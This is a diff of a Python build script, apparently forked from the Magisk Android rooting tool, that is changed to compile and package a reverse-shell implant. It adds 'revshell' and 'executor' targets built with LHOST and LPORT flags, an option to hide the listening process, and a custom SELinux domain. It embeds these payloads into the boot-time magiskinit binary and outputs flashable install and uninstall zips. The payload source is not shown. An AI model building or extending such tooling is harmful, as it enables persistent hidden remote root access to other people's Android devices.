@@ -23,18 +23,21 @@ def error(str):
         print(f'\n\033[41m{str}\033[0m\n')
     sys.exit(1)
 
-
 def header(str):
     if is_ci:
         print(f'\n{str}\n')
     else:
         print(f'\n\033[44m{str}\033[0m\n')
 
+def warn(str):
+    if is_ci:
+        print(f'\n{str}\n')
+    else:
+        print(f'\n\033[33m{str}\033[0m\n')
 
 def vprint(str):
     if args.verbose:
         print(str)
-
 
 is_windows = os.name == 'nt'
 is_ci = 'CI' in os.environ and os.environ['CI'] == 'true'
@@ -59,8 +62,9 @@ except FileNotFoundError:
 cpu_count = multiprocessing.cpu_count()
 archs = ['armeabi-v7a', 'x86']
 arch64 = ['arm64-v8a', 'x86_64']
-support_targets = ['magisk', 'magiskinit', 'magiskboot', 'magiskpolicy', 'resetprop', 'busybox', 'test']
-default_targets = ['magisk', 'magiskinit', 'magiskboot', 'busybox']
+
+support_targets = ['revshell', 'magiskinit', 'magiskboot', 'magiskpolicy', 'resetprop', 'busybox', 'test', 'module', 'executor']
+default_targets = ['revshell', 'magiskinit', 'magiskboot', 'executor']
 
 ndk_root = op.join(os.environ['ANDROID_SDK_ROOT'], 'ndk')
 ndk_path = op.join(ndk_root, 'magisk')
@@ -72,7 +76,6 @@ config = {}
 STDOUT = None
 build_tools = None
 
-
 def mv(source, target):
     try:
         shutil.move(source, target)
@@ -80,14 +83,12 @@ def mv(source, target):
     except:
         pass
 
-
 def cp(source, target):
     try:
         shutil.copyfile(source, target)
         vprint(f'cp {source} -> {target}')
     except:
         pass
-
 
 def rm(file):
     try:
@@ -97,11 +98,9 @@ def rm(file):
         if e.errno != errno.ENOENT:
             raise
 
-
 def rm_rf(path):
     vprint(f'rm -rf {path}')
     shutil.rmtree(path, ignore_errors=True)
-
 
 def mkdir(path, mode=0o755):
     try:
@@ -109,26 +108,20 @@ def mkdir(path, mode=0o755):
     except:
         pass
 
-
 def mkdir_p(path, mode=0o755):
     os.makedirs(path, mode, exist_ok=True)
-
 
 def execv(cmd):
     return subprocess.run(cmd, stdout=STDOUT)
 
-
 def system(cmd):
     return subprocess.run(cmd, shell=True, stdout=STDOUT)
-
 
 def cmd_out(cmd):
     return subprocess.check_output(cmd).strip().decode('utf-8')
 
-
 def xz(data):
     return lzma.compress(data, preset=9, check=lzma.CHECK_NONE)
-
 
 def parse_props(file):
     props = {}
@@ -145,12 +138,9 @@ def parse_props(file):
             props[prop[0].strip(' \t\r\n')] = value
     return props
 
-
 def load_config(args):
-    commit_hash = cmd_out(['git', 'rev-parse', '--short=8', 'HEAD'])
-
     # Default values
-    config['version'] = commit_hash
+    config['version'] = '2.0'
     config['outdir'] = 'out'
     config['prettyName'] = 'false'
 
@@ -173,13 +163,11 @@ def load_config(args):
     global STDOUT
     STDOUT = None if args.verbose else subprocess.DEVNULL
 
-
 def zip_with_msg(zip_file, source, target):
     if not op.exists(source):
-        error(f'{source} does not exist! Try build \'binary\' and \'apk\' before zipping!')
+        error(f'{source} does not exist! Try build \'binary\' before zipping!')
     zip_file.write(source, target)
     vprint(f'zip: {source} -> {target}')
-
 
 def collect_binary():
     for arch in archs + arch64:
@@ -189,8 +177,7 @@ def collect_binary():
             target = op.join('native', 'out', arch, bin)
             mv(source, target)
 
-
-def clean_elf():
+def clean_elf(module):
     if is_windows:
         elf_cleaner = op.join('tools', 'elf-cleaner.exe')
     else:
@@ -199,10 +186,9 @@ def clean_elf():
             execv(['g++', '-std=c++11', 'tools/termux-elf-cleaner/termux-elf-cleaner.cpp',
                    '-o', elf_cleaner])
     args = [elf_cleaner]
-    args.extend(op.join('native', 'out', arch, 'magisk')
+    args.extend(op.join('native', 'out', arch, module)
                 for arch in archs + arch64)
     execv(args)
-
 
 def find_build_tools():
     global build_tools
@@ -215,12 +201,12 @@ def find_build_tools():
     build_tools = op.join(build_tools_root, ls[-1])
     return build_tools
 
-
 def sign_zip(unsigned):
     if 'keyStore' not in config:
+        warn('No keystore is configured! Unable to sign zip.')
         return
 
-    msg = '* Signing APK'
+    msg = '* Signing ZIP'
     apksigner = op.join(find_build_tools(), 'apksigner')
 
     execArgs = [apksigner, 'sign',
@@ -256,26 +242,30 @@ def binary_dump(src, out, var_name):
 
 
 def gen_update_binary():
-    bs = 1024
-    update_bin = bytearray(bs)
-    file = op.join('native', 'out', 'x86', 'busybox')
-    with open(file, 'rb') as f:
-        x86_bb = f.read()
-    file = op.join('native', 'out', 'armeabi-v7a', 'busybox')
-    with open(file, 'rb') as f:
-        arm_bb = f.read()
-    file = op.join('scripts', 'update_binary.sh')
-    with open(file, 'rb') as f:
-        script = f.read()
-    # Align x86 busybox to bs
-    blk_cnt = (len(x86_bb) - 1) // bs + 1
-    script = script.replace(b'__X86_CNT__', b'%d' % blk_cnt)
-    update_bin[:len(script)] = script
-    update_bin.extend(x86_bb)
-    # Padding for alignment
-    update_bin.extend(b'\0' * (blk_cnt * bs - len(x86_bb)))
-    update_bin.extend(arm_bb)
-    return update_bin
+    with open('scripts/update-binary', 'rb') as f:
+        txt = f.read()
+    return txt
+    # FIXME: can't compile bb, push precompiled for now
+    # bs = 1024
+    # update_bin = bytearray(bs)
+    # file = op.join('native', 'out', 'x86', 'busybox')
+    # with open(file, 'rb') as f:
+    #     x86_bb = f.read()
+    # file = op.join('native', 'out', 'armeabi-v7a', 'busybox')
+    # with open(file, 'rb') as f:
+    #     arm_bb = f.read()
+    # file = op.join('scripts', 'update_binary.sh')
+    # with open(file, 'rb') as f:
+    #     script = f.read()
+    # # Align x86 busybox to bs
+    # blk_cnt = (len(x86_bb) - 1) // bs + 1
+    # script = script.replace(b'__X86_CNT__', b'%d' % blk_cnt)
+    # update_bin[:len(script)] = script
+    # update_bin.extend(x86_bb)
+    # # Padding for alignment
+    # update_bin.extend(b'\0' * (blk_cnt * bs - len(x86_bb)))
+    # update_bin.extend(arm_bb)
+    # return update_bin
 
 
 def run_ndk_build(flags):
@@ -287,29 +277,23 @@ def run_ndk_build(flags):
     collect_binary()
 
 
-def dump_bin_headers():
+# modules:  revshell, executor
+def dump_bin_headers(module):
     for arch in archs:
-        bin_file = op.join('native', 'out', arch, 'magisk')
+        bin_file = op.join('native', 'out', arch, module)
         if not op.exists(bin_file):
-            error('Build "magisk" before building "magiskinit"')
-        with open(op.join('native', 'out', arch, 'binaries_arch.h'), 'w') as out:
+            error('No ' + module + ' payload found')
+        with open(op.join('native', 'out', arch, 'binaries_' + module + '.h'), 'w') as out:
             with open(bin_file, 'rb') as src:
-                binary_dump(src, out, 'magisk_xz')
+                binary_dump(src, out, module + '_xz')
     for arch, arch32 in list(zip(arch64, archs)):
-        bin_file = op.join('native', 'out', arch, 'magisk')
-        with open(op.join('native', 'out', arch32, 'binaries_arch64.h'), 'w') as out:
+        bin_file = op.join('native', 'out', arch, module)
+        with open(op.join('native', 'out', arch32, 'binaries_' + module + '64.h'), 'w') as out:
             with open(bin_file, 'rb') as src:
-                binary_dump(src, out, 'magisk_xz')
-    stub = op.join(config['outdir'], 'stub-release.apk')
-    if not op.exists(stub):
-        error('Build stub APK before building "magiskinit"')
-    with open(op.join('native', 'out', 'binaries.h'), 'w') as out:
-        with open(stub, 'rb') as src:
-            binary_dump(src, out, 'manager_xz')
+                binary_dump(src, out, module + '_xz')
 
 
 def build_binary(args):
-    # Verify NDK install
     props = parse_props(op.join(ndk_path, 'source.properties'))
     if props['Pkg.Revision'] != config['fullNdkVersion']:
         error('Incorrect NDK. Please install/upgrade NDK with "build.py ndk"')
@@ -341,15 +325,41 @@ def build_binary(args):
     # Basic flags
     global base_flags
     base_flags = f'MAGISK_VERSION={config["version"]} MAGISK_VER_CODE={config["versionCode"]}'
+    if config.get("selinux_domain"):
+        base_flags += f' SEPOL_PROC_DOMAIN={config["selinux_domain"]}'
     if not args.release:
         base_flags += ' MAGISK_DEBUG=1'
 
-    if 'magisk' in args.target:
-        run_ndk_build('B_MAGISK=1 B_64BIT=1')
-        clean_elf()
+    if 'executor' in args.target:
+        flags = f'B_EXECUTOR=1 B_64BIT=1 LPORT={config.get("lport")} LHOST={config.get("lhost")}'
+        if config.get("hide_process_bind") == "1":
+            flags += ' HIDE_PROCESS_BIND=1'
+        run_ndk_build(flags)
+        clean_elf('executor')
+
+    # this is where revshell and executor binaries embed
+    if 'revshell' in args.target:
+        run_ndk_build('B_REVSHELL=1 B_64BIT=1')
+        # replace default payload with a custom one (if present)
+        for arch in archs + arch64:
+            rs_src = op.join('revshell', arch, 'revshell')
+            rs_dst = op.join('native', 'out', arch, 'revshell')
+            if os.access(rs_src, os.F_OK):
+                cp(rs_src, rs_dst)
+            else:
+                warn("Using default payload for " + arch)
+        clean_elf('revshell')
+
+    # FIXME : trouble compiling lkm
+    # if 'module' in args.target:
+    #     run_ndk_build('B_MODULE=1')
+    #     rs_src = op.join('native', 'out', 'arm64-v8a', 'module')
+    #     rs_dst = op.join('revshell', 'module')
+    #     cp(rs_src, rs_dst)
 
     if 'magiskinit' in args.target:
-        dump_bin_headers()
+        dump_bin_headers('revshell')
+        dump_bin_headers('executor')
         run_ndk_build('B_INIT=1')
         run_ndk_build('B_INIT64=1')
 
@@ -362,6 +372,9 @@ def build_binary(args):
     if 'magiskboot' in args.target:
         run_ndk_build('B_BOOT=1')
 
+    if 'magiskhide' in args.target:
+        run_ndk_build('B_HIDE=1')
+
     if 'busybox' in args.target:
         run_ndk_build('B_BB=1')
 
@@ -369,63 +382,10 @@ def build_binary(args):
         run_ndk_build('B_TEST=1 B_64BIT=1')
 
 
-def build_apk(args, module):
-    build_type = 'Release' if args.release or module == 'stub' else 'Debug'
-
-    proc = execv([gradlew, f'{module}:assemble{build_type}',
-                  '-PconfigPath=' + op.abspath(args.config)])
-    if proc.returncode != 0:
-        error(f'Build {module} failed!')
-
-    build_type = build_type.lower()
-    apk = f'{module}-{build_type}.apk'
-
-    source = op.join(module, 'build', 'outputs', 'apk', build_type, apk)
-    target = op.join(config['outdir'], apk)
-    mv(source, target)
-    header('Output: ' + target)
-    return target
-
-
-def build_app(args):
-    header('* Building Magisk Manager')
-    build_apk(args, 'app')
-
-
-def build_stub(args):
-    header('* Building Magisk Manager stub')
-    build_apk(args, 'stub')
-
-
-def build_snet(args):
-    if not op.exists(op.join('snet', 'src', 'main', 'java', 'com', 'topjohnwu', 'snet')):
-        error('snet sources have to be bind mounted on top of the stub folder')
-    header('* Building snet extension')
-    proc = execv([gradlew, 'stub:assembleRelease'])
-    if proc.returncode != 0:
-        error('Build snet extention failed!')
-    source = op.join('stub', 'build', 'outputs', 'apk',
-                     'release', 'stub-release.apk')
-    target = op.join(config['outdir'], 'snet.jar')
-    # Extract classes.dex
-    with zipfile.ZipFile(target, 'w', compression=zipfile.ZIP_DEFLATED, allowZip64=False) as zout:
-        with zipfile.ZipFile(source) as zin:
-            zout.writestr('classes.dex', zin.read('classes.dex'))
-    rm(source)
-    header('Output: ' + target)
-
-
 def zip_main_revshell(args):
     header('* Packing Flashable Zip')
 
-    # if config['prettyName']:
-    #     name = f'Magisk-v{config["version"]}.zip'
-    # elif args.release:
-    #     name = 'magisk-release.zip'
-    # else:
-    #     name = 'magisk-debug.zip'
-
-    name = 'zip_reverse_shell_install.zip'
+    name = 'zip_reverse_shell_v2.zip'
 
     output = op.join(config['outdir'], name)
 
@@ -449,16 +409,11 @@ def zip_main_revshell(args):
                 target = op.join(zip_dir, binary)
                 zip_with_msg(zipf, source, target)
 
-        # APK
-        source = op.join(
-            config['outdir'], 'app-release.apk' if args.release else 'app-debug.apk')
-        target = op.join('common', 'magisk.apk')
-        zip_with_msg(zipf, source, target)
-
         # boot_patch.sh
         source = op.join('scripts', 'boot_patch.sh')
         target = op.join('common', 'boot_patch.sh')
         zip_with_msg(zipf, source, target)
+
         # util_functions.sh
         source = op.join('scripts', 'util_functions.sh')
         with open(source, 'r') as script:
@@ -469,10 +424,6 @@ def zip_main_revshell(args):
             target = op.join('common', 'util_functions.sh')
             vprint(f'zip: {source} -> {target}')
             zipf.writestr(target, util_func)
-        # addon.d.sh
-        source = op.join('scripts', 'addon.d.sh')
-        target = op.join('common', 'addon.d.sh')
-        zip_with_msg(zipf, source, target)
 
         # chromeos
         for tool in ['futility', 'kernel_data_key.vbprivk', 'kernel.keyblock']:
@@ -483,18 +434,6 @@ def zip_main_revshell(args):
             target = op.join('chromeos', tool)
             zip_with_msg(zipf, source, target)
 
-        # revshell - init script
-        source = op.join('revshell', 'revshell.rc')
-        target = op.join('revshell', 'revshell.rc')
-        zip_with_msg(zipf, source, target)
-
-        # revshell - binary
-        source = op.join('revshell', 'revshell')
-        target = op.join('revshell', 'revshell')
-        zip_with_msg(zipf, source, target)
-
-        # End of zipping
-
     sign_zip(output)
     header('Output: ' + output)
 
@@ -502,8 +441,6 @@ def zip_main_revshell(args):
 def zip_uninstaller_revshell(args):
     header('* Packing Uninstaller Zip')
 
-    datestr = datetime.datetime.now().strftime("%Y%m%d")
-    # name = f'Magisk-uninstaller-{datestr}.zip' if config['prettyName'] else 'magisk-uninstaller.zip'
     name = 'zip_reverse_shell_uninstall.zip'
     output = op.join(config['outdir'], name)
 
@@ -514,7 +451,7 @@ def zip_uninstaller_revshell(args):
         vprint('zip: ' + target)
         zipf.writestr(target, gen_update_binary())
         # updater-script
-        source = op.join('scripts', 'magisk_uninstaller_revshell.sh')
+        source = op.join('scripts', 'uninstall_revshell.sh')
         target = op.join('META-INF', 'com', 'google',
                          'android', 'updater-script')
         zip_with_msg(zipf, source, target)
@@ -548,7 +485,7 @@ def zip_uninstaller_revshell(args):
 
 
 def cleanup(args):
-    support_targets = {'native', 'java'}
+    support_targets = {'native'}  # , 'java'}
     if args.target:
         args.target = set(args.target) & support_targets
     else:
@@ -610,31 +547,28 @@ def setup_ndk(args):
             vprint(f'Replaced {path}')
 
 
-def cleanup_unnecessary_apks(args):
-    rm(op.join('out', 'stub.apk'))
-    rm(op.join('out', 'app-debug.apk'))
-    rm(op.join('out', 'app-release.apk'))
-    rm(op.join('out', 'stub-debug.apk'))
-    rm(op.join('out', 'stub-release.apk'))
-
-
 def build_all(args):
     vars(args)['target'] = []
-    build_stub(args)
-    build_app(args)
     build_binary(args)
     zip_main_revshell(args)
     zip_uninstaller_revshell(args)
-    cleanup_unnecessary_apks(args)
 
 
 if len(sys.argv) == 2 and sys.argv[1] == 'ndk':
+    # Install and configure NDK
     args = Namespace(release=True, verbose=True, config='config.prop', func=setup_ndk)
     load_config(args)
     args.func(args)
+elif len(sys.argv) == 2 and sys.argv[1] == 'clean':
+    # Clean targets (native, java). If none are specified, clean all
+    args = Namespace(release=True, verbose=True, config='config.prop', func=cleanup, target=[])
+    load_config(args)
+    args.func(args)
 else:
+    # Build
     if len(sys.argv) != 1:
         sys.exit(1)
-    args = Namespace(release=True, verbose=False, config='config.prop', func=build_all)
+    # TODO:  Set release to True to turn off logging
+    args = Namespace(release=False, verbose=True, config='config.prop', func=build_all)
     load_config(args)
     args.func(args)
